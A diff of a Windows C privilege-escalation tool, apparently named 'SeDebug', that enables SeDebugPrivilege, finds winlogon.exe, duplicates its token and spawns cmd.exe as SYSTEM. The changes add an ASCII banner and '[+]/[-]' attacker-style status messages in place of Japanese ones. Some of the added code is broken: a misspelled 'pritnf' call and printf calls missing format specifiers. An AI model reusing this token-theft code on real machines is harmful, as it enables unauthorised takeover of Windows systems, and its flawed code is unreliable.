@@ -3,6 +3,16 @@
 #include <string.h>
 #include <TlHelp32.h>
 
+void print_banner() {
+    printf (
+        "  _________      ________        ___.                 "
+        " /   _____/ ____ \______ \   ____\_ |__  __ __  ____  "
+        " \_____  \_/ __ \ |    |  \_/ __ \| __ \|  |  \/ ___\ "
+        " /        \  ___/ |    `   \  ___/| \_\ \  |  / /_/  >"
+        "/_______  /\___  >_______  /\___  >___  /____/\___  / "
+        "        \/     \/        \/     \/    \/     /_____/  "
+    );
+}
 
 int main() {
 
@@ -38,11 +48,15 @@ int main() {
 
     // get LUID to SeDebugPrivilege
 
-    LookupPrivilegeValueA(
+    if (LookupPrivilegeValueA(
         NULL, // 特権名を取得するシステムの名前
         "SeDebugPrivilege", // privname
         &luid
-    );
+    ) == FALSE ){
+        printf("[-]LookupPrivilegeValueA:", GetLastError());
+    } else {
+        pritnf("[+]Successfully found SeDebug LUID");
+    }
     
     // add
     tp.Privileges[0].Luid = luid;
@@ -54,33 +68,29 @@ int main() {
         TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  // https://learn.microsoft.com/ja-jp/windows/win32/secauthz/access-rights-for-access-token-objects
         &hToken
     ) == FALSE) {
-        printf("OpenProcessToken失敗: %lu\n", GetLastError());
+        printf("OpenProcessToken Failed:", GetLastError());
         return 1;
+    } else {
+        printf("Successfully OpenProcessToken");
     }
-    printf("OpenProcessToken成功\n");
+    
 
-
-    if (hToken == NULL) {
-        printf("失敗\n");
-        return 1;
-    }
-    printf("成功\n");
 
     // enable SeDebugPrivilege
 
-    BOOL adjresult = AdjustTokenPrivileges (
+    if (AdjustTokenPrivileges (
         hToken,
         FALSE,
         &tp,
         sizeof(tp),
         NULL,
         NULL
-    );
-    if (adjresult == FALSE) {
-    printf("AdjustTokenPrivileges失敗: %lu\n", GetLastError());
-    return 1;
-}
-printf("SeDebugPrivilege有効化成功\n");
+    ) == FALSE ){
+        printf("[-]AdjustTokenPrivileges failed:", GetLastError());
+        return 1;
+    } else {
+        printf("[+]Successfully enabled SeDebugPrivilege");
+    }
 
     HANDLE hsprocess = CreateToolhelp32Snapshot(
         TH32CS_SNAPPROCESS,
@@ -89,9 +99,8 @@ printf("SeDebugPrivilege有効化成功\n");
     Process32First(hsprocess,&pe);
     
     do{
-        printf("PID: %lu Name: %s\n", pe.th32ProcessID, pe.szExeFile);
         if (strcmp(pe.szExeFile, "winlogon.exe") == 0){
-            printf("winlogon.exe");
+            printf("[+]Successfully found winlogon.exe");
             break;
         };
     }while(Process32Next(hsprocess, &pe));
@@ -125,10 +134,10 @@ printf("SeDebugPrivilege有効化成功\n");
         TokenPrimary,
         &hDuplicateSystemToken
     ) == FALSE) {
-        printf("DuplicateTokenEx失敗: %lu\n", GetLastError());
+        printf("[-]DuplicateTokenEx Failed: %lu\n", GetLastError());
         return 1;
     }
-    printf("DuplicateTokenEx成功\n");
+    printf("[+]Successfully DuplicateTokenEx\n");
 
     BOOL result = CreateProcessWithTokenW(
     hDuplicateSystemToken,
@@ -143,10 +152,10 @@ printf("SeDebugPrivilege有効化成功\n");
     );
 
     if (result == FALSE) {
-    printf("失敗: %lu\n", GetLastError());
+    printf("[-]Filed: %lu\n", GetLastError());
     return 1;
     }
-    printf("成功\n");
+    printf("[+]Successfly New cmd.exe\n");
 
 
     // clean up
